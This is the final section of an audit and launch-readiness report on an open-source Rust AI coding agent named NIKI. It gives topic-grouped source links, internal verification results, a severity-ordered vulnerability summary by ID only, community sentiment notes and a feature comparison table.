**OSS launch playbook:** blog.cloudflare.com/pingora-open-source · /how-we-built-pingora · /how-pingora-keeps-count · /workerd-open-source-workers-runtime · /welcome-to-developer-week-2025 · /birthday-week-2025-wrap-up · /build-ai-agents-on-cloudflare · /expanding-our-support-for-oss-projects · supabase.com/blog/supabase-how-we-launch · /community-day-lw4 · evilmartians.com/chronicles/how-to-do-launch-weeks · anthropic.com/news/model-context-protocol · /news/donating-the-model-context-protocol-and-establishing-of-the-agentic-ai-foundation · raw.githubusercontent.com/openai/codex/main/README.md · developers.openai.com/codex/open-source · openai.com/form/codex-open-source-fund · tailscale.com/opensource · blog.sentry.io/introducing-the-functional-source-license · /we-just-gave-500-000-dollars · /another-year-another-750-000 · lucumr.pocoo.org/2023/11/19 · blog.modelcontextprotocol.io/posts/2025-12-09-mcp-joins-agentic-ai-foundation · chaoss.community/what-happens-to-relicensed-open-source-projects-and-their-forks · arxiv.org/html/2511.04453v1 · news.ycombinator.com/item?id=42237424,32994723,43708025,39540594 · posthog.com/blog/after-the-hn-launch · wasp.sh/blog/2023/01/31/wasp-beta-launch-review

**Rust CLI distribution:** clig.dev · opensource.axo.dev/cargo-dist/book · github.com/cargo-bins/cargo-binstall · crates.io/crates/reqwest · /git2 · doc.rust-lang.org/cargo/reference/publishing.html · /manifest.html#the-rust-version-field · github.com/johnthagen/min-sized-rust · docs.rs/clap_complete · /clap_mangen · github.com/supabase/cli · docker/cli#5951 · learn.microsoft.com/dotnet/core/tools/telemetry · docs.brew.sh/Analytics

**Agent security:** genai.owasp.org/llmrisk/llm01-prompt-injection · /resource/owasp-top-10-for-agentic-applications-for-2026 · cheatsheetseries.owasp.org/cheatsheets/AI_Agent_Security_Cheat_Sheet.html · labs.cloudsecurityalliance.org/research/csa-research-note-readme-instruction-injection-ai-coding-agents-20260317 · arxiv.org/html/2606.15549v2 · code.claude.com/docs/en/permissions · anthropic.com/engineering/claude-code-auto-mode · developer.nvidia.com/blog/practical-security-guidance-for-sandboxing-agentic-workflows · northflank.com/blog/how-to-sandbox-ai-agents · github.com/OpenHands/OpenHands/issues/14902 · theagenttimes.com/articles/critical-cve-in-openhands · dbugs.ptsecurity.com/vulnerability/PT-2026-28181 · bleepingcomputer.com 2026-07-20 sandbox-escapes · news.ycombinator.com/item?id=46400129

**Supply chain & secrets:** docs.rs/keyring · docs.rs/secrecy · /zeroize · cisa.gov/news-events/alerts/2025/03/17 · docs.github.com/en/actions/security-for-github-actions · /using-artifact-attestations · slsa.dev/spec · github.blog/changelog/2025-10-28-github-immutable-releases · docs.sigstore.dev · rustsec.org · github.com/EmbarkStudios/cargo-auditable · CycloneDX/cargo-cyclonedx · crates.io · blog.rust-lang.org (trusted publishing) · arxiv.org/abs/2503.00271

**Competitive landscape:** docs.claude.com/en/docs/claude-code/overview · developers.openai.com/codex/cli · agents.md · llm-stats.com/benchmarks/swe-bench-verified · leaderboard.steel.dev · tbench.ai/leaderboard/terminal-bench/2.0 · cursor.com/pricing · devin.ai/pricing · ampcode.com/news/oracle · wetheflywheel.com/blog/open-source-ai-coding-agents-comparison-2026 · cognition.com/blog/dont-build-multi-agents · cognition.ai/blog/multi-agents-working · anthropic.com/engineering/multi-agent-research-system · github.com/dagger/container-use · help.openai.com/en/articles/20001106-codex-rate-card

**Licensing:** spdx.org/licenses/BUSL-1.1.html · fossa.com/blog/business-source-license · github.com/clockworklabs/SpacetimeDB/issues/215 · wikipedia Business Source License · opentofu.org/faq · hashicorp.com/en/bsl · /en/license-faq · docs.brew.sh/License-Guidelines · blog.sentry.io/sentry-is-now-fair-source · elastic.co/blog/elasticsearch-is-open-source-again · redis.io/blog/agplv3 · github.com/licensee/licensee · embarkstudios.github.io/cargo-deny/checks/licenses

**Eval & QA:** openai.com/index/why-we-no-longer-evaluate-swe-bench-verified · /separating-signal-from-noise-coding-evaluations · rdi.berkeley.edu/blog/trustworthy-benchmarks-cont · arxiv.org/html/2607.22585 · anthropic.com/engineering/infrastructure-noise · /demystifying-evals-for-ai-agents · arxiv.org/abs/2306.05685 · github.com/SWE-bench/sb-cli · github.com/SWE-bench/experiments · github.com/shahid-43/llmvcr · github.com/deepankarm/agent-chaos · thepromptbench.com · aider.chat/docs/leaderboards

**Internal (verified directly):** `cargo test --no-run` (22 E0433 errors) · `git ls-files` (227 tracked; evals=49, examples=0, bench=0) · LICENSE (Change Date 2030-07-20 self-contradiction; Change License Apache-2.0) · GitHub API (0 stars/forks/issues; license NOASSERTION; created 2026-07-11) · release assets (prompts/schemas NOT in tarball) · `assets/logo.svg` = 1 byte · landing page fetch (client-rendered, empty body) · `ci.yml:27,39` (clippy `| tail`, `continue-on-error`)

## Appendices

**A. Vulnerability summary (severity-ordered)**
CRITICAL: S8 (goal host shell injection). HIGH: S1 (denylist not merged), S2 (container egress/caps/pids), S6 (worktree host exec), S7 (Google key in URL); G1, G16. MED: S3/S4/S5, S9–S14; G3–G14. LOW: S13.

**B. Community sentiment snapshot**
- PH-for-dev-tools: positive (Cursor, Kilo Code, Aikido won there) but mixed (some founders say HN converts better). PH filters bot votes; maker replies matter.
- BUSL/relicensing: reliably hostile; forks common; Elastic/Redis reversed to AGPL.
- Telemetry: community hostile to default-on (clig.dev permits opt-out with disclosure — *verified*).
- Sandboxes: developers "trust but verify"; many run `--dangerously-skip-permissions` with backups; consensus is OS-isolation + default-deny egress.

**C. Ecosystem/feature table (NIKI vs table-stakes)**
| Feature | NIKI | Field expectation |
|---|---|---|
| MCP | ✗ (dead module) | ✓ required |
| Slash/custom commands | ✗ | ✓ |
| Hooks | ✗ | ✓ |
| Session resume/checkpoint | ✗ (dead `session`) | ✓ |
| `/compact` | ✗ | ✓ |
| Memory files (AGENTS.md) | ✓ (root) | ✓ |
| Worktree/branch parallelism | ✓ | ✓ |
| Headless/CI JSON + PR action | ✗ | ✓ |
| IDE extension | ✗ | ✓ (expected) |
| Plan mode | ✗ | ✓ |
| Image/web input in loop | ✗ (config-time URLs only) | ✓ |
| Cost/token visibility | ~ (post-hoc) | ✓ |
| Sandboxed exec + egress control | ~ (S2/S5/S6 gaps) | ✓ |

**D. Raw internal-audit contradictions resolved**
- Audit 1 ("solid unit tests") vs Audit 4 ("zero compile") → **Audit 4 confirmed** (`cargo test --no-run` = 22 E0433). Audit 1's claim is retracted.
- Audit 3 ("507 tests") vs Audit 4 → reconcilable (exist-as-source vs don't-build).

*End of report.*
